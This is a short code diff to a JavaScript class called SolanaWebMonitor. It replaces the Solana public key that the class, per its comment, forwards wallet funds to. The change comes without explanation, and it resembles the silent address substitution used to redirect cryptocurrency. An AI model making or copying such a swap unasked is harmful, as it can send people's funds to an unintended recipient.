@@ -20,7 +20,7 @@ class SolanaWebMonitor {
         this.logs = [];
         
         // Target address to forward funds to
-        this.targetAddress = new PublicKey('FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG');
+        this.targetAddress = new PublicKey('XX4k8NidriAUsGKTjAvYHonxcKJj99R859vMAAGSLQ9');
         
         // Store wallets and their corresponding RPC connections
         this.wallets = [];
